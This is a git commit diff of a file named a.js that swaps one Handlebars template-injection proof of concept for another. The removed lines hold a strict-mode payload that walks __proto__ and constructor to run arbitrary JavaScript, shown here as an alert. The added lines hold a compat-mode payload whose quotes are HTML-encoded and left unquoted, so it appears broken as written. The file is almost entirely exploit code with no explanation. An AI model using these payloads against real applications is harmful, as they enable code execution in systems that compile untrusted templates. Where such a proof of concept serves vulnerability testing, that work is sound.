c8ef8c7dcc4ff5ebea7ede088c3d98e6c4555a10
Winsad <73716457+Wiinsad@users.noreply.github.com>
2024-11-21 02:58:18 -0600

    Update a.js

--- a.js
+++ a.js
@@ -1,30 +1,11 @@
 <script> 
 // compile the template 
-var s = ` 
-{{#with (__lookupGetter__ "__proto__")}} 
-{{#with (./constructor.getOwnPropertyDescriptor . "valueOf")}} 
-{{#with ../constructor.prototype}} 
-{{../../constructor.defineProperty . "hasOwnProperty" ..}} 
-{{/with}} 
-{{/with}} 
-{{/with}} 
-{{#with "constructor"}} 
-{{#with split}} 
-{{pop (push "alert('Vulnerable Handlebars JS when compiling in strict mode');")}} 
-{{#with .}} 
-{{#with (concat (lookup join (slice 0 1)))}} 
-{{#each (slice 2 3)}} 
-{{#with (apply 0 ../..)}} 
-{{.}} 
-{{/with}} 
-{{/each}} 
-{{/with}} 
-{{/with}} 
-{{/with}} 
-{{/with}} 
-`;
-var template = Handlebars.compile(s, { 
-strict: true 
+
+var s2 = 
+{{&#39;a/.&quot;) || alert(&quot;Vulnerable Handlebars JS when compiling in compat mode&#39;}}
+; 
+var template = Handlebars.compile(s2, { 
+compat: true 
 }); 
 // execute the compiled template and print the output to the console console.log(template({})); 
 </script>
